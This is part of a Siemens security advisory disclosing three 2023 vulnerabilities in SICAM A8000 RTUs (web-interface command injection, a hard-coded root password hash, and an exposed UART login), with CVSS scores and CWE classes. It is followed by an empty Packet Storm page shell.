The SICAM A8000 RTUs (Remote Terminal Units) series is a modular device range for telecontrol and
automation applications in all areas of energy supply.

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.1
(CVSS v3.1) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

An additional classiﬁcation has been performed using the CWE classiﬁcation, a community-developed list
of common software security weaknesses. This serves as a common language and as a baseline for
weakness identiﬁcation, mitigation, and prevention efforts. A detailed list of CWE classes can be found at:
https://cwe.mitre.org/.

Vulnerability CVE-2023-33919

The web interface of affected devices is vulnerable to command injection due to missing server side
input sanitation. This could allow an authenticated privileged remote attacker to execute arbitrary code
with root privileges.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.2
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-77:
Command (’Command Injection’)

Improper Neutralization of Special Elements used in a

Vulnerability CVE-2023-33920

The affected devices contain the hash of the root password in a hard-coded form, which could be
exploited for UART console login to the device. An attacker with direct physical access could exploit
this vulnerability.

CVSS v3.1 Base Score
CVSS Vector
CWE

6.8
CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-798: Use of Hard-coded Credentials

Vulnerability CVE-2023-33921

The affected devices contain an exposed UART console login interface. An attacker with direct physical
access could try to bruteforce or crack the root password to login to the device.

CVSS v3.1 Base Score
CVSS Vector
CWE

6.8
CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-749: Exposed Dangerous Method or Function

ACKNOWLEDGMENTS

Siemens thanks the following party for its efforts:

• SEC Consult Vulnerability Lab for reporting the vulnerability on behalf of Netz Niederösterreich

GmbH, EVN Gruppe

SSA-731916

© Siemens 2023

Page 2 of 3

Siemens Security Advisory by Siemens ProductCERT

ADDITIONAL INFORMATION

For further inquiries on security vulnerabilities in Siemens products and solutions, please contact the
Siemens ProductCERT:

https://www.siemens.com/cert/advisories

HISTORY DATA

V1.0 (2023-06-13):

Publication Date

TERMS OF USE

Siemens Security Advisories are subject to the terms and conditions contained in Siemens’ underlying
license terms or other applicable agreements previously agreed to with Siemens (hereinafter "License
Terms"). To the extent applicable to information, software or documentation made available in or through
a Siemens Security Advisory, the Terms of Use of Siemens’ Global Website (https://www.siemens.com/
terms_of_use, hereinafter "Terms of Use"), in particular Sections 8-10 of the Terms of Use, shall apply
additionally. In case of conﬂicts, the License Terms shall prevail over the Terms of Use.

SSA-731916

© Siemens 2023

Page 3 of 3



=== Content from packetstormsecurity.com_0937536d_20250111_131421.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


